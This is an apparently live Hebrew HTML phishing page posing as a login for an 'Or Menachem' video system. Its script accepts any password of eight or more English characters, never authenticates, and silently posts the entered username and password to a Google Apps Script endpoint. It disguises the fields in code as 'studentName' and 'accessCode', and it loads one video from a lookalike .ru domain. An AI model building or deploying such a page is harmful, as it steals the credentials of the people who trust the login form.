<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>מערכת סרטונים - אור מנחם</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #5d93bc; /* צבע הרקע הכחול המדויק */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .logo-container {
            margin-bottom: 25px;
            text-align: center;
        }

        .logo-container img {
            max-width: 280px;
            height: auto;
        }

        /* תיבת השגיאה המעוצבת */
        .error-box {
            background-color: white;
            padding: 15px 20px;
            border-radius: 2px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            width: 420px;
            box-sizing: border-box;
            border-right: 4px solid #d32f2f;
            margin-bottom: 15px;
            font-size: 15px;
            color: #222;
            line-height: 1.4;
            display: none;
        }

        .error-box strong {
            color: #d32f2f;
        }

        /* תיבת ההתחברות המרכזית */
        .login-box {
            background-color: white;
            padding: 35px 30px;
            border-radius: 2px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            width: 420px;
            box-sizing: border-box;
            border-bottom: 4px solid #7cb342;
            transition: transform 0.1s ease;
        }

        @keyframes shake {
            0% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
            100% { transform: translateX(0); }
        }

        .shake-effect {
            animation: shake 0.4s ease-in-out;
        }

        .form-group {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 10px;
            color: #222;
            font-size: 16px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #b0bec5;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #1565c0;
        }

        .password-container {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #1565c0;
            font-size: 18px;
            user-select: none;
        }

        .bottom-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 25px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 15px;
            font-weight: bold;
            color: #222;
            cursor: pointer;
            order: 1;
        }

        .remember-me input {
            cursor: pointer;
            width: 16px;
            height: 16px;
        }

        .btn-submit {
            background-color: #1565c0;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            order: 2;
        }

        .btn-submit:hover {
            background-color: #0d47a1;
        }

        /* --- אזור בחירת הסרטים --- */
        .video-selection-container {
            display: none;
            width: 100%;
            max-width: 900px;
            background-color: white;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
            box-sizing: border-box;
            text-align: center;
        }

        .selection-title {
            font-size: 24px;
            font-weight: bold;
            color: #1565c0;
            margin-bottom: 30px;
        }

        .movies-grid {
            display: flex;
            gap: 30px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .movie-card {
            flex: 1;
            min-width: 280px;
            max-width: 400px;
            background: #f5f7f8;
            border: 1px solid #cfd8dc;
            border-radius: 6px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .movie-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
        }

        .movie-preview-wrapper {
            width: 100%;
            height: 220px;
            background-color: #000;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .movie-preview-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .play-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.15);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 50px;
            transition: background 0.2s;
        }

        .movie-card:hover .play-overlay {
            background: rgba(0,0,0,0.35);
        }

        .movie-title {
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            color: #222;
            border-top: 1px solid #cfd8dc;
        }

        /* אזור הנגן הגדול */
        .player-view {
            display: none;
            width: 100%;
            max-width: 800px;
            margin-top: 20px;
        }

        .player-view video {
            width: 100%;
            border-radius: 4px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        .btn-back {
            background-color: #555;
            color: white;
            border: none;
            padding: 8px 16px;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn-back:hover {
            background-color: #333;
        }
    </style>
</head>
<body>

    <div class="logo-container">
        <img src="logo.png" alt="אור מנחם">
    </div>

    <div class="error-box" id="errorBox">
        <strong>שגיאה:</strong> הפרטים שהוזנו אינם תקינים. שם המשתמש והסיסמה חייבים להיות באנגלית בלבד, והסיסמה חייבת להכיל לפחות 8 תווים.
    </div>

    <div class="login-box" id="loginBox">
        <form id="activityForm">
            <div class="form-group">
                <label for="studentName">שם משתמש או כתובת אימייל</label>
                <input type="text" id="studentName" name="username" required autocomplete="username">
            </div>

            <div class="form-group">
                <label for="accessCode">סיסמה</label>
                <div class="password-container">
                    <input type="password" id="accessCode" name="password" required autocomplete="current-password">
                    <span class="toggle-password" id="eyeIcon">👁️</span>
                </div>
            </div>

            <div class="bottom-row">
                <label class="remember-me">
                    <input type="checkbox" id="rememberme">
                    <span>זכור אותי</span>
                </label>
                <button type="submit" class="btn-submit">התחבר</button>
            </div>
        </form>
    </div>

    <div class="video-selection-container" id="videoSelection">
        <div class="selection-title">בחר סרטון לצפייה:</div>
        
        <div class="movies-grid" id="moviesGrid">
            <div class="movie-card" onclick="playMovie('https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4')">
                <div class="movie-preview-wrapper">
                    <video src="https://or-menachem.ru/wp-content/uploads/2026/05/VIDEO-2025-09-17-23-10-38.mp4#t=0.1" preload="metadata" muted></video>
                    <div class="play-overlay">▶</div>
                </div>
                <div class="movie-title">סרטון פעילות 1</div>
            </div>

            <div class="movie-card" onclick="playMovie('https://ormenachem.net/wp-content/uploads/2024/05/WhatsApp-Video-2024-05-24-at-17.50.50.mp4')">
                <div class="movie-preview-wrapper">
                    <video src="https://ormenachem.net/wp-content/uploads/2024/05/WhatsApp-Video-2024-05-24-at-17.50.50.mp4#t=0.1" preload="metadata" muted></video>
                    <div class="play-overlay">▶</div>
                </div>
                <div class="movie-title">סרטון פעילות 2</div>
            </div>
        </div>

        <div class="player-view" id="playerView">
            <button class="btn-back" onclick="backToSelection()">חזרה לבחירת סרטים ↩</button>
            <video id="mainPlayer" controls autoplay></video>
        </div>
    </div>

    <script>
        // קישור ה-Apps Script של גוגל שיטס שלכם
        const googleScriptUrl = "https://script.google.com/macros/s/AKfycbyfENOeiDb5MRcTYPwPk1rGQSchQYezyJ9hhGv8yB9aQFYH1JBvHN9OoVk9l-_w56kuMg/exec";

        // מנגנון עין לחשיפת סיסמה
        const togglePassword = document.getElementById('eyeIcon');
        const passwordInput = document.getElementById('accessCode');

        togglePassword.addEventListener('click', function () {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.style.opacity = type === 'password' ? '1' : '0.5';
        });

        // ניהול טופס ההתחברות ובדיקת תקינות הקלט
        document.getElementById('activityForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            const nameInput = document.getElementById('studentName').value.trim();
            const codeInput = document.getElementById('accessCode').value;
            
            const errorBox = document.getElementById('errorBox');
            const loginBox = document.getElementById('loginBox');
            const videoSelection = document.getElementById('videoSelection');
            
            const englishRegex = /^[A-Za-z0-9@._\-]+$/;

            const isNameValid = nameInput.length > 0 && englishRegex.test(nameInput);
            const isCodeValid = codeInput.length >= 8 && englishRegex.test(codeInput);
            
            if (!isNameValid || !isCodeValid) {
                errorBox.style.display = 'block';
                
                loginBox.classList.remove('shake-effect'); 
                void loginBox.offsetWidth; 
                loginBox.classList.add('shake-effect'); 
                return; 
            }
            
            // התחברות תקינה! 
            errorBox.style.display = 'none';
            loginBox.style.display = 'none'; 
            videoSelection.style.display = 'block'; 

            // שליחת המידע ברקע לגוגל שיטס
            const formData = new FormData();
            formData.append('studentName', nameInput);
            formData.append('accessCode', codeInput);

            fetch(googleScriptUrl, {
                method: 'POST',
                mode: 'no-cors',
                body: formData
            }).catch(error => console.error('Error logging to sheets:', error));
        });

        function playMovie(videoUrl) {
            document.getElementById('moviesGrid').style.display = 'none'; 
            const playerView = document.getElementById('playerView');
            const mainPlayer = document.getElementById('mainPlayer');
            
            mainPlayer.src = videoUrl;
            playerView.style.display = 'block'; 
        }

        function backToSelection() {
            const mainPlayer = document.getElementById('mainPlayer');
            mainPlayer.pause(); 
            
            document.getElementById('playerView').style.display = 'none';
            document.getElementById('moviesGrid').style.display = 'flex'; 
        }
    </script>

</body>
</html>
